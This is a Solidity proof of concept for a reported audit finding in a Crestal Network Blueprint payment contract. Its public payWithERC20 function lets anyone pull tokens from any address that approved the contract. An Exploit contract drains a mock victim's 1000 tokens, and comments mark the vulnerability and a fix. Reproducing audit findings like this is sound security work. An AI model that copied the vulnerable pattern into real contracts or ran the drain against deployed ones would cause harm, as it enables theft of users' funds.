// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Crestal Network BlueprintV5 Payment — Sherlock H-1, March 2025 (issue 260)
    payWithERC20 is public and takes an arbitrary `fromAddress`. Anyone the
    Blueprint is approved to pull can be drained. The victim approved 1000 USDC
    while creating an agent. The attacker calls payWithERC20 and receives it.

    Verbatim body: the three requires and token.safeTransferFrom(from, to, amount).
*/

contract MockUSDC {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

library SafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 amount) internal {
        require(token.transferFrom(from, to, amount), "safeTransferFrom"); // @> VULN: public payWithERC20 inlines this pull of any approved fromAddress
    }
}

contract Payment {
    using SafeERC20 for IERC20;

    mapping(address => bool) public paymentTokens;

    function addPaymentAddress(address token) external {
        paymentTokens[token] = true;
    }

    function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public {
        require(paymentTokens[erc20TokenAddress], "token not enabled");
        require(fromAddress != toAddress, "Cannot transfer to self address");
        require(toAddress != address(0), "Invalid to address");
        require(amount > 0, "Amount must be greater than 0");
        IERC20 token = IERC20(erc20TokenAddress);
        token.safeTransferFrom(fromAddress, toAddress, amount); // @> VULN: public pull of any payer who approved this contract
        // FIX: make payWithERC20 internal and set fromAddress = msg.sender
    }
}

contract Victim {
    function approve(MockUSDC token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract Exploit {
    MockUSDC public usdc; // CREATE nonce 1
    Victim public victim; // CREATE nonce 2
    Payment public blueprint; // CREATE nonce 3 — vulnerable

    constructor() {
        usdc = new MockUSDC();
        victim = new Victim();
        blueprint = new Payment();
        blueprint.addPaymentAddress(address(usdc)); // admin enables the payment token
        usdc.mint(address(victim), 1000 ether);
        victim.approve(usdc, address(blueprint), 1000 ether);
    }

    function run() external {
        uint256 beforeBal = usdc.balanceOf(address(victim));
        blueprint.payWithERC20(address(usdc), beforeBal, address(victim), address(this));
        require(usdc.balanceOf(address(victim)) == 0, "victim drained");
        require(usdc.balanceOf(address(this)) == 1000 ether, "attacker received 1000");
    }
}
